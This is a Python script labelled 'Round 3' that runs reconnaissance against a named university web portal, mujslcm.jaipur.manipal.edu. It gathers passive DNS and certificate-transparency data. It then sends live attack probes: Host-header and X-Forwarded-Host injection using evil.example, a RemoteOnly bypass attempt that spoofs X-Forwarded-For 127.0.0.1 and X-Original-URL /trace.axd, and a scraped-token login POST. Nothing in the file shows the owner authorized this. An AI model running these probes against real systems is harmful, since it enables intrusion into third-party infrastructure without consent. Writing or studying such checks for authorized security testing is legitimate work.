#!/usr/bin/env python3
"""Round 3: passive DNS evidence (parents + CT estate liveness), plus targeted live probes.

Live probes stay on mujslcm only: host header handling, trust-based RemoteOnly bypass attempt,
one token-bearing empty POST (synthetic, no credentials), static cache metadata, and the two
distinct 404 bodies. Single requests, ~1.6 s apart.
"""
import json, os, re, subprocess, time, datetime

T = "mujslcm.jaipur.manipal.edu"
OUT = os.path.expanduser("~/mujslcm-recon/recon/layers-2026-09-13")
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
summary = {}


def doh(name, rtype="A"):
    out = subprocess.run(["curl", "-sS", "-m", "20", "-H", "accept: application/dns-json",
                          f"https://cloudflare-dns.com/dns-query?name={name}&type={rtype}"],
                         capture_output=True, text=True).stdout
    try:
        d = json.loads(out)
        return [str(a.get("data")) for a in d.get("Answer", [])]
    except Exception:
        return ["ERR"]


def sh(cmd, t=30):
    r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
    return r.stdout.decode(errors="replace")


# 1. parent-domain DNS, saved properly this time
parents = {}
for dom in ("jaipur.manipal.edu", "muj.manipal.edu", "manipal.edu"):
    parents[dom] = {}
    for rt in ("A", "MX", "TXT", "NS", "SOA", "CAA"):
        parents[dom][rt] = doh(dom, rt)
    for sub, rt in (("_dmarc." + dom, "TXT"), ("_mta-sts." + dom, "TXT"), ("autodiscover." + dom, "CNAME"),
                    ("enterpriseregistration." + dom, "CNAME"), ("selector1._domainkey." + dom, "CNAME"),
                    ("selector2._domainkey." + dom, "CNAME")):
        parents[dom][sub] = doh(sub, rt)
    time.sleep(0.5)
json.dump(parents, open(os.path.join(OUT, "dns-parents.json"), "w"), indent=1)
print("parents saved:", sum(len(v) for v in parents.values()), "records")

# 2. CT estate liveness by passive DNS only (no requests to sibling hosts)
names = [l.strip() for l in open(os.path.join(OUT, "ct-names.txt")) if l.strip()]
live = {}
for n in names:
    a = doh(n, "A")
    live[n] = a if a and not a[0].startswith("ERR") else []
    time.sleep(0.35)
json.dump(live, open(os.path.join(OUT, "ct-liveness.json"), "w"), indent=1)
resolved = {k: v for k, v in live.items() if v}
print(f"CT names resolved by passive DNS: {len(resolved)} of {len(names)}")
for k, v in sorted(resolved.items()):
    print(f"  {k:<44} {', '.join(v)[:70]}")

# 3. live probes, target only
rows = []


def req(label, path="/", method="GET", extra=""):
    open("/tmp/_b", "w").close()
    cmd = f'curl -sS -k -m 25 -A "{UA}" -X {method} {extra} -D /tmp/_h -o /tmp/_b "https://{T}{path}"'
    subprocess.run(cmd, shell=True, capture_output=True)
    head = open("/tmp/_h", encoding="utf-8", errors="replace").read() if os.path.exists("/tmp/_h") else ""
    body = open("/tmp/_b", encoding="utf-8", errors="replace").read()
    st = (re.search(r"HTTP/\S+ (\d+)", head) or [None, "000"])[1]
    hdr = {k.lower(): v.strip() for k, v in re.findall(r"(?im)^([a-z0-9\-]+):\s*(.+)$", head)}
    exc = sorted({e.replace("System.", "") for e in re.findall(r"System\.[A-Za-z\.]+Exception", body)})
    loc = hdr.get("location", "")
    rows.append({"label": label, "status": st, "bytes": len(body), "location": loc,
                 "exceptions": exc, "etag": hdr.get("etag"), "cache_control": hdr.get("cache-control"),
                 "x_frame_options": hdr.get("x-frame-options"), "host_header_seen": "evil.example" in body})
    print(f"  {label:<40} {st}  {len(body):>6}b  loc={loc[:40]:<40} exc={','.join(exc) or '-'}")
    time.sleep(1.6)
    return body


print("\n== host header handling ==")
req("Host evil.example (raw H1)", "/", extra='-H "Host: evil.example" --http1.1')
req("Host evil.example absolute-uri", "/", extra='-H "Proxy-Connection: keep-alive" --request-target "https://evil.example/"')
req("X-Forwarded-Host injection", "/", extra='-H "X-Forwarded-Host: evil.example"')

print("\n== RemoteOnly trust-bypass attempt (GAP-1) ==")
req("XFF 127.0.0.1 + Host localhost", "/Home/Index?enc=z",
    extra='-H "X-Forwarded-For: 127.0.0.1" -H "Host: localhost" --http1.1')
req("X-Original-URL /trace.axd", "/", extra='-H "X-Original-URL: /trace.axd"')

print("\n== static file metadata ==")
req("GET jquery-1.10.2.min.js", "/Scripts/jquery-1.10.2.min.js")

print("\n== 404 body classes ==")
b1 = req("404 /Views/", "/Views/")
b2 = req("404 /Home/NoSuchAction", "/Home/NoSuchAction/extra/seg")
open(os.path.join(OUT, "body-404-views.html"), "w").write(b1[:80000])
open(os.path.join(OUT, "body-404-app.html"), "w").write(b2[:80000])
for name, b in (("views-404", b1), ("app-404", b2)):
    t = re.sub(r"<[^>]+>", " ", b)
    t = re.sub(r"\s+", " ", t)
    print(f"  {name} text: {t[:150]}")

print("\n== token-bearing empty POST (server-side validation recheck, no credentials) ==")
page = sh(f'curl -sS -k -m 25 -A "{UA}" -c /tmp/_c "https://{T}/"')
tok = (re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', page) or [None, None])[1]
print("  token obtained:", "yes" if tok else "no", len(tok or ""))
if tok:
    req("POST empty with valid token", "/", method="POST",
        extra=f"-b /tmp/_c -H 'Content-Type: application/x-www-form-urlencoded' "
              f"--data '__RequestVerificationToken={tok}&UserName=&Password=&LoginFor=student&EmailFor=x%40muj.manipal.edu'")

json.dump({"target": T, "when": datetime.datetime.now().isoformat(), "rows": rows},
          open(os.path.join(OUT, "ROUND3.json"), "w"), indent=1)
print(f"\n-> ROUND3.json ({len(rows)} rows)")
